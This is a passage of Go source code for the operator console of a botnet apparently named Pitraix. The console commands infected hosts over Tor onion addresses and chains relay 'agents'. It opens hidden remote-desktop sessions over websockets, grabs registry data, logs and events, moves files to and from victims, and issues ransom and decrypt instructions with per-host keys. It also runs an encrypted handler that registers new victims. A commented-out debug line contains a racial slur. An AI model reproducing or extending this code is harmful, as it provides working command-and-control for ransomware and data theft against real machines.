							routes := hostring_d.Routes[firstIndex - 1]
							sAddr  := hostring_d.Address[secondIndex - 1]
							// fmt.Println(fAddr, sAddr)
							
							fmt.Printf("%s>%s Assigning %s%s%s to %s%s%s", yellowColor, endColor, greenColor, sAddr, endColor, greenColor, fAddr, endColor)

							hstAES_Key, _ := base64.StdEncoding.DecodeString(hostring_d.Key[firstIndex - 1])

							insts_marshalled, _ := json.Marshal([]string{"assign " + sAddr})

							_, err = doInstru(fAddr, insts_marshalled, hstAES_Key, true)

							if err != nil {
								fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)

							} else {
								if len(routes) == 0 {
									fmt.Printf("\n%s>%s Host %s%s%s is an Agent now!\n", blueColor, endColor, blueColor, fAddr, endColor)
								}

								hostring_d.Routes[firstIndex - 1] = append(hostring_d.Routes[firstIndex - 1], secondIndex - 1)
								// fmt.Println(hostring_d)

								jsonDump, _ := json.MarshalIndent(hostring_d, "", " ")
								f, err := os.Create("hostring.json")

								if err != nil {
									fmt.Println("Error creating hostring file!", f, err)

								} else {
									f.Write(jsonDump)
									fmt.Println("Updated hostring file")
									f.Close()

								}

								fmt.Printf("%s>%s Done\n", blueColor, endColor)

							}

						} else {
							fmt.Printf("%s>%s you %smust%s supply agent and host indexes!\n", redColor, endColor, redColor, endColor)

						}

					case "rdp":
						if len(line_splitted) == 2 {
							index, err := strconv.Atoi(line_splitted[1])
							if err != nil || index > len(hostring_d.Address) {
								fmt.Printf("%s>%s invalid index %s%s%s\n\n", redColor, endColor, redColor, line_splitted[1], endColor)
								continue

							}
							
							addr  := hostring_d.Address[index  - 1]

							fmt.Printf("%s>%s Connecting to %s%s%s via %swebsocket%s\n", yellowColor, endColor, greenColor, addr, endColor, greenColor, endColor)

							err = nil
							hstAES_Key, _ := base64.StdEncoding.DecodeString(hostring_d.Key[index - 1])

							insts_marshalled, _ := json.Marshal([]string{"getwsrdpkey 1"})

							rdp_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
							
							rdp_onetimeKey := strings.TrimSpace(strings.Replace(string(rdp_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))

							if err != nil {
								fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)

							} else {
								// interrupt := make(chan os.Signal, 1)
								// signal.Notify(interrupt, os.Interrupt)
								
								fmt.Println("rdp_onetimeKey", rdp_onetimeKey)

								fmt.Printf("%s>%s Finalizing connection to %s%s%s..\n", greenColor, endColor, greenColor, addr, endColor)

								// fmt.Printf("Finalizing connecting to %s..\n", addr)

								proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")

								wsdialer := websocket.Dialer{
									Proxy: http.ProxyURL(proxyURL),
								}

								c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + rdp_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
								
								if err != nil {
									fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)

								} else {
									defer c.Close()

									done := make(chan struct{})

									go func() {
										defer close(done)
										for {
											_, message, err := c.ReadMessage()

											if err != nil {
												fmt.Println("read error:", err)
												return

											}

											rdpSENTasyncChn <- base64.StdEncoding.EncodeToString(message)
											// fmt.Printf("recv: %s\n", message)

										}

									}()

									go func() {
										for {
											select {
											case data := <- rdpRECVAsyncChn:

												err := c.WriteMessage(websocket.TextMessage, data)
												if err != nil {
													fmt.Println("write error:", err)
													return

												}

											}

										}

									}()


									go func(indx int, hrd *t_HST) {
										if runtime.GOOS != "linux" {
											legacy_doInstru("shellnoop", "start msgedge 127.0.0.1:1337/" + onetimeKey + "rdp")

										} else {
											legacy_doInstru("shellnoop", "firefox 127.0.0.1:1337/" + onetimeKey + "rdp")

										}

									}(index, &hostring_d)

									for data := range rdpAsyncChn {
										rdpRECVAsyncChn <- data
									}


								}


							}

						} else {
							fmt.Printf("%s>%s you %smust%s host index!\n", redColor, endColor, redColor, endColor)

						}

					case "snatch":
						if line_instru == "reg" || line_instru == "regs" || line_instru == "registers" {
							instructions = append(instructions, "snatchregs 1")

						} else if line_instru == "log" || line_instru == "logs" {
							instructions = append(instructions, "snatchlogs 1")
						
						} else if line_instru == "event" || line_instru == "events" {
							instructions = append(instructions, "snatchevents 1")

						} else {
							fmt.Printf("%s>%s Invalid option %s%s%s\n", redColor, endColor, redColor, line_instru, endColor)
						}
						
					case "quit", "exit":
						fmt.Printf("%s>%s Exiting\n\n", blueColor, endColor)
						os.Exit(0)

					default:
						fmt.Printf("%s>%s Invalid instruction %s%s%s\n", redColor, endColor, redColor, line, endColor)

					}

					history = append(history, line)

					fmt.Print("\n")

				}
			}

			err = scanner.Err()
			if err != nil {
				fmt.Println(redColor + ">" + endColor + " Error occured with input scanner: " + err.Error())
			}

			if operand == 2 && len(selected) == 0 {
				fmt.Printf("%s>%s You have %s0%s hosts selected!\n\n", redColor, endColor, redColor, endColor)

			} else {

				fmt.Printf("%s>%s Executing instructions sequence\n", blueColor, endColor)
				ninstructions := []string{}

				for _, v := range instructions {
					if strings.HasPrefix(v, "ransom") || strings.HasPrefix(v, "decrypt"){
						v += " HSTRSKEYf0x1337INSTruction"
					}
					// fmt.Println(v)
					ninstructions = append(ninstructions, v)

				}

				insts_marshalled, _ := json.Marshal(ninstructions)
				// download := false

				for index, _ := range hostring_d.Address {
					if operand == 2 && !contains(selected, index) {
						continue
					}

					// fmt.Println(string(insts_marshalled))
					
					// if len(instructions) == 1 && strings.HasPrefix(instructions[0], "download") {
					// 	download = true
					// }

					hstAddress := hostring_d.Address[index]
					hstAES_Key, err := base64.StdEncoding.DecodeString(hostring_d.Key[index])

					if err != nil {
						fmt.Println("Key base64 is corrupted!", err)

					}

					if crout == 1 {
						fmt.Printf("%s%d >%s Instructing %s%s%s via Agent\n", greenColor, index + 1, endColor, greenColor, hstAddress, endColor)
						var route int = -1

						for ind2, routes := range hostring_d.Routes {
							if route != -1 {
								break
							}

							for _, r := range routes {
								if r == index {
									fmt.Println("my man")
									route = ind2
									break
								}
							}

						}

						if route == -1 {
							fmt.Printf("%s>%s No agents responsible for %s%s%s skipping..\n", yellowColor, endColor, yellowColor, hstAddress, endColor)
							// / fmt.Println("A", hstAddress)

						} else {
							insts_marshalled = []byte(strings.Replace(string(insts_marshalled), "HSTRSKEYf0x1337INSTruction", hostring_d.RasKey[route], -1))
							payload_enc, nonce, _ := encrypt_AES(insts_marshalled, hstAES_Key)
							
							payload_enc_tmp_1 := base64.StdEncoding.EncodeToString(payload_enc)
							payload_enc_tmp_2 := base64.StdEncoding.EncodeToString(nonce)
							payload :=  payload_enc_tmp_1 + "|" + payload_enc_tmp_2
		
							if operand == 1 {
								hstAddress = "*"
							}

							insts_marshalled_2, _ := json.Marshal([]string{"relay " + hstAddress + " " + payload})
							hstAES_Key, err = base64.StdEncoding.DecodeString(hostring_d.Key[route])

							if err != nil {
								fmt.Println("Key base64 is corrupted!", err)
							}

							_, err = doInstru(hostring_d.Address[route], insts_marshalled_2, hstAES_Key, true)
							// fmt.Println(out, err)

							if err == nil {
								fmt.Printf("%s>%s Done\n", blueColor, endColor)

							} else {
								fmt.Printf("\n%s>%s Agent is %soffline%s\n", redColor, endColor, redColor, endColor)
							}

						}

					} else {
						insts_marshalled = []byte(strings.Replace(string(insts_marshalled), "HSTRSKEYf0x1337INSTruction", hostring_d.RasKey[index], -1))
						fmt.Printf("%s%d >%s Instructing %s%s%s directly\n", greenColor, index + 1, endColor, greenColor, hstAddress, endColor)

						out, err := doInstru(hstAddress, insts_marshalled, hstAES_Key, true)
						// fmt.Println(out, err)
						if err == nil {
							// if download == false {
							// } else {
							output := strings.TrimSpace(string(out))
							output_splitted := strings.Split(output, "<PiTrIaXMaGGi$N$9a1n>")
	//						test_out := strings.Split(output, "<PiTrIaXMaGGi$N$9a1n>>")


							// fmt.Println(output, output_splitted)
							for indx, output := range output_splitted {
								if indx >= len(instructions) {
									break
								}
								
								// output = strings.Replace(strings.TrimSpace(output), "<PiTrIaXMaGGi$N$9a1n>", "", -1)
								
								// fmt.Println("nigger", instructions[indx], output)
								if strings.HasPrefix(instructions[indx], "download")  { // ################ might cause problems #################
									// fmt.Println(output)
									if strings.HasPrefix(output, "Error:") {
										fmt.Println(output)
										
									} else {
										content, err := base64.StdEncoding.DecodeString(output)
										if err == nil {
											ctime := time.Now().String() // strings.Replace(time.Now().String(), "-", "", -1)
											// ctime = ctime[2:strings.Index(ctime, ".")]
											// ctime = strings.Replace(ctime, " ", "", -1)
											// ctime = strings.Replace(ctime, ":", "", -1)

											f, _ := os.Create(filepath.Join("Downloads", ctime + "_" + filepath.Base(strings.Split(instructions[indx], " ")[1])))
											f.Write(content)
											f.Close()
											fmt.Printf("\n%s%s >%s %s\n\n", blueColor, instructions[indx], endColor, "Done")
										} else {
											fmt.Println("Malformed file content", output, err)
										}
									}

								} else if strings.HasPrefix(instructions[indx], "snatchlogs") {
									logsf, err := readFile("logs.json")
									if err != nil {
										logsf = []byte("{}")
									}
									var logs map[string]map[string][]string
									json.Unmarshal(logsf, &logs)
									// fmt.Println(err)

									var outputLogs map[string][]string
									err = json.Unmarshal([]byte(output), &outputLogs)
									if err != nil {
										log("snatchlogs - unmarshal output", "Error:" + err.Error())
										fmt.Println("error")
									} else {
										if _, ok := logs[strconv.Itoa(index + 1)]; !ok {
											logs[strconv.Itoa(index + 1)] = map[string][]string{}
										}
										for _, outl := range outputLogs {
											// fmt.Println("wat", logs, outl, index)
											logs[strconv.Itoa(index + 1)][strconv.Itoa(len(logs[strconv.Itoa(index + 1)]) + 1)] = []string{outl[0], outl[1], outl[2]}
											// logs.Logs[strconv.Itoa(index)][len(logs.Logs[strconv.Itoa(index)]) + 1] = []string{outl[0], outl[1], outl[2]}
										}
										f, _ := os.Create("logs.json")
										out, _ := json.MarshalIndent(logs, "", "  ")
										f.Write(out)
										f.Close()
										fmt.Printf("\n%s>%s Logs have been %supdated%s\n\n", blueColor, endColor, blueColor, endColor)
									}

								} else if strings.HasPrefix(instructions[indx], "snatchevents") {
									eventsf, err := readFile("events.json")
									if err != nil {
										eventsf = []byte("{}")
									}
									var events map[string]map[string][]string
									json.Unmarshal(eventsf, &events)
									// fmt.Println(err)

									var outputEvents map[string][]string
									err = json.Unmarshal([]byte(output), &outputEvents)
									if err != nil {
										log("snatchlogs - unmarshal output", "Error:" + err.Error())
										fmt.Println("error")
									} else {
										if _, ok := events[strconv.Itoa(index + 1)]; !ok {
											events[strconv.Itoa(index + 1)] = map[string][]string{}
										}
										for _, outl := range outputEvents {
											// fmt.Println("wat", logs, outl, index)
											events[strconv.Itoa(index + 1)][strconv.Itoa(len(events[strconv.Itoa(index + 1)]) + 1)] = []string{outl[0], outl[1], outl[2]}
											// logs.Logs[strconv.Itoa(index)][len(logs.Logs[strconv.Itoa(index)]) + 1] = []string{outl[0], outl[1], outl[2]}
										}
										f, _ := os.Create("events.json")
										out, _ := json.MarshalIndent(events, "", "  ")
										f.Write(out)
										f.Close()
										fmt.Printf("\n%s>%s Events have been %supdated%s\n\n", blueColor, endColor, blueColor, endColor)
									}
									
								} else {
									if strings.HasPrefix(instructions[indx], "upload")  {
										fmt.Printf("\n%s%s >%s %s\n\n", blueColor, "upload " + strings.Split(instructions[indx], " ")[1], endColor, output)
									} else {
										fmt.Printf("\n%s%s >%s %s\n\n", blueColor, instructions[indx], endColor, output)
									}
								}

								
							}
						} else {
							fmt.Printf("\n%s>%s Host %s%s%s is %soffline%s\n", redColor, endColor, redColor, hstAddress, endColor, redColor, endColor)
							// fmt.Println(hstAddress, "is offline")
						}
					}
				}
			}
		}
	}()

	var antiddosCounter int = 0

	go func(antiddosCounter *int) {
		for {
			if *antiddosCounter == 0 {
				time.Sleep(1 * time.Second)
			} else {
				time.Sleep(5 * time.Second)
				*antiddosCounter = *antiddosCounter - 5
			}
		}
	}(&antiddosCounter)


	// fmt.Println(onetimeKey + "rdp")
	http.HandleFunc("/" + onetimeKey + "rdp", rdpfront)
	http.HandleFunc("/" + twotimeKey + "rdp", rdpback)
	
	http.HandleFunc("/pitraix", func(writer http.ResponseWriter, req *http.Request) {
		// req.Body = http.MaxBytesReader(writer, req.Body, 5000) // if anything wrong, its prolly dis bitch
		if req.Method == "GET" {
			io.WriteString(writer, "0")
			fmt.Printf("%sRegister_Handler >%s Got GET request. %v\n", yellowColor, endColor, req)
		} else if req.Method == "POST" {
			reqBody, _ := ioutil.ReadAll(req.Body)
			if len(reqBody) > 0 && isASCII(string(reqBody)) {
				dataSlice := strings.Split(string(reqBody), "|")
				if len(dataSlice) == 3 { // register
					// fmt.Println(antiddosCounter)
					// os.Exit(1)
					if antiddosCounter == 0 {
						antiddosCounter = ddosCounter
						// fmt.Println(dataSlice)
						// temp_pem_decode, _ := pem.Decode([]byte(operPrivKey))
						// operKeyProcessed, _ := x509.ParsePKCS1PrivateKey(temp_pem_decode.Bytes)
						
						aes_Key := RSA_OAEP_Decrypt(dataSlice[0], *operPrivKey)
						temp_payload_1, _ := base64.StdEncoding.DecodeString(dataSlice[1])
						temp_payload_2, _ := base64.StdEncoding.DecodeString(dataSlice[2])

						payload, err := decrypt_AES(temp_payload_1, temp_payload_2, aes_Key)
						// fmt.Println(string(payload), err)
						if isASCII(string(payload)) {
							var newHST t_HSTSingle
							err = json.Unmarshal(payload, &newHST)
							if err != nil {
								fmt.Println("Failed to unmarshal json payload!", string(payload), err)
								go log("Register_Handler", "Failed to unmarshal json payload: " + err.Error())

								io.WriteString(writer, "0")
							} else {
								if basic_antiDDOS_check(&newHST) {
									newHST.Key = base64.StdEncoding.EncodeToString(aes_Key)
									hostRing_FileChn <- newHST
									io.WriteString(writer, "1")
								} else {
									// fmt.Println("Failed basic_antiDDOS_check!")
									go log("Register_Handler", "Failed basic_antiDDOS_check")
								}
							}
						} else {
							// fmt.Printf("%sRegister_Handler >%s Decrypted is not ASCII! %s\n", yellowColor, endColor, string(payload))
							io.WriteString(writer, "0")
							go log("Register_Handler", "Decrypted is not ASCII! " + string(payload))
						}
					} else {
						fmt.Println("anti ddos caught something", antiddosCounter)
						go log("Register_Handler", "Anti-DDos caught something: " + string(reqBody))
						
					}
				
				} else if len(dataSlice) == 2 { // instruction
					fmt.Println("we got instruction wtf", dataSlice)

				} else {
					// fmt.Printf("%sRegister_Handler >%s Got POST request without DataSlice 3! %v %d\n", yellowColor, endColor, dataSlice, len(dataSlice))
					io.WriteString(writer, "0")
					go log("Register_Handler", "Got POST request without DataSlice 3: " + string(reqBody))

				}
			} else {
				// fmt.Printf("\n%sRegister_Handler >%s Got POST request without valid data: %v %v\n", yellowColor, endColor, reqBody, string(reqBody))
				io.WriteString(writer, "0")
				go log("Register_Handler", "Got POST request without valid data: " + string(reqBody))

			}
		} else {
			fmt.Println("Hello Fake", req.Method)
		}
	})
	http.ListenAndServe("127.0.0.1:1337", nil) // make this dynamic later
}


func rdpfront(writer http.ResponseWriter, req *http.Request) {
	// if req.Method == "GET" {
	io.WriteString(writer, fmt.Sprintf(`<!DOCTYPE html>
	<html>
		<head>
			<title>Pitraix</title>
		</head>
		<body>
			<img src="" alt="Move your mouse or press any key" id="screen"></img>
		</body>
		<script>
			const twokey = "%s";
			
			conn = new WebSocket("ws://127.0.0.1:1337/"+ twokey + "rdp");
			conn.onclose = function (evt) {
				alert("Lost connection to websocket");
			};
			conn.onmessage = function (evt) {
				var img = evt.data // .split('\n');
				document.getElementById("screen").src="data:image/png;base64," + img;
			};
	
			alert("Wait a second then Close this alert");
			
			conn.send("ready");
			onmousemove = function(e){
				// console.log("mouse location:", e.clientX, e.clientY)
				conn.send("move " + e.clientX + " " + e.clientY)
			}
	
			window.onload = function() {
				document.getElementsByTagName('body')[0].onkeyup = function(e) { 
					console.log("key " + e.keyCode)
					conn.send("key " + e.keyCode)
				}
			};
	
		</script>
	</html>`, twotimeKey))
	// fmt.Printf("%sRegister_Handler >%s Got GET request. %v\n", yellowColor, endColor, req)
	// } else {
	// 	fmt.Println("hello there", req.Method)
	// }
}

func rdpback(writer http.ResponseWriter, r *http.Request) {
	upgrader.CheckOrigin = func(r *http.Request) bool { return true }
	c, err := upgrader.Upgrade(writer, r, nil)
	
	if err != nil {
		fmt.Println("upgrade connection error:", err)
		return
	}
	
	defer c.Close()


	var hotgirlb int = 10
	var hotegirl int
	
	go func(heg *int) {
		for {
			if *heg > 0 {
							  // 0.79999995
				*heg = *heg - 1
			
			} else if *heg < 0 {
				fmt.Println("This shouldn't be happening, please open an issue on github: ", *heg)
				*heg = hotgirlb
			
			}

			// fmt.Println(*heg)
			time.Sleep(100 * time.Millisecond)
		}
	}(&hotegirl)
	
	for {
		mt, message, err := c.ReadMessage()
		if err != nil {
			fmt.Println("read error:", err)
			break
		}

		if string(message) == "ready" {
			continue

		} else {			
			// go func() {
			// rdpSENTasyncChn <- base
			
			rdpAsyncChn <- message

			if hotegirl == 0 {
				rdpAsyncChn <- []byte("img")
				hotegirl = hotgirlb
				
				go func(mt int, c *websocket.Conn) {
					newimg := <- rdpSENTasyncChn

					err = c.WriteMessage(mt, []byte(newimg))
					if err != nil {
						fmt.Println("write error:", err)
						// rdpDone <- true
						return
					}
				
				}(mt, c)

			}

			// }()
			
		}
		
	}

}




func postRequest(target_url string, data []byte, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}

	req, _ := http.NewRequest("POST", target_url, bytes.NewBuffer(data))
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func getRequest(target_url string, useTor bool, timeout time.Duration) ([]byte, error) {
	client := &http.Client{}
	if timeout != -1 {
		client = &http.Client{
			Timeout: time.Second * timeout,
		}
	}

	if useTor == true {
		torTransport := &http.Transport{Dial: tbDialer.Dial}
		client = &http.Client{
			Transport: torTransport,
			Timeout: time.Second * timeout,
		}
	}
	
	req, _ := http.NewRequest("GET", target_url, nil)
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0")

	resp, err := client.Do(req)
	if err != nil {
		return []byte{}, err
	}

	defer resp.Body.Close()
	
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return []byte{}, err
	}

	return body, nil
}

func decrypt_AES(cipher_Text []byte, nonce []byte, key []byte) ([]byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, err
	}

	decrypted_Cipher, err := gcm.Open(nil, nonce, cipher_Text, nil)
	if err != nil {
		return []byte{}, err
	}

	return decrypted_Cipher, nil
}

func encrypt_AES(text []byte, key []byte) ([]byte, []byte, error) {
	cphr, err := aes.NewCipher(key)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	gcm, err := cipher.NewGCM(cphr)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	return gcm.Seal(nil, nonce, text, nil), nonce, nil
}

func create_signature(msg []byte, privateKey rsa.PrivateKey) ([]byte, []byte, error) {
	msgHash := sha512.New()
	_, err := msgHash.Write(msg)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	msgHashSum := msgHash.Sum(nil)
	signature, err := rsa.SignPSS(rand.Reader, &privateKey, crypto.SHA512, msgHashSum, nil)
	if err != nil {
		return []byte{}, []byte{}, err
	}
	
	return signature, msgHashSum, nil
}

func verify_signature(publicKey rsa.PublicKey, msgHashSum []byte, signature []byte) error {
	err := rsa.VerifyPSS(&publicKey, crypto.SHA512, msgHashSum, signature, nil)
	if err != nil {
		return err
	}

	return nil
}

func RSA_OAEP_Encrypt(secretMessage []byte, publicKey rsa.PublicKey) string {
    rng := rand.Reader
    ciphertext, err := rsa.EncryptOAEP(sha512.New(), rng, &publicKey, secretMessage, nil)
	if err != nil {
        fmt.Println(err)
    }
    return base64.StdEncoding.EncodeToString(ciphertext)
}

func RSA_OAEP_Decrypt(cipherText string, privateKey rsa.PrivateKey) []byte {
    ct, _ := base64.StdEncoding.DecodeString(cipherText)
    rng := rand.Reader
    plaintext, err := rsa.DecryptOAEP(sha512.New(), rng, &privateKey, ct, nil)
    if err != nil {
        fmt.Println(err)
    }
    return plaintext
}

func isASCII(s string) bool {
    for _, c := range s {
        if c > unicode.MaxASCII && c != 257 && c != 233 && c != 201 && c != 193 {
			fmt.Println(string(c), c, unicode.MaxASCII)
            return false
        }
    }
    return true
}

func random_Bytes(l int, t bool) []byte {
	b := make([]byte, l)
	if t == true { // secure rand
		rand.Read(b)
	} else {
		rdmod.Read(b)
	}

	return b
}
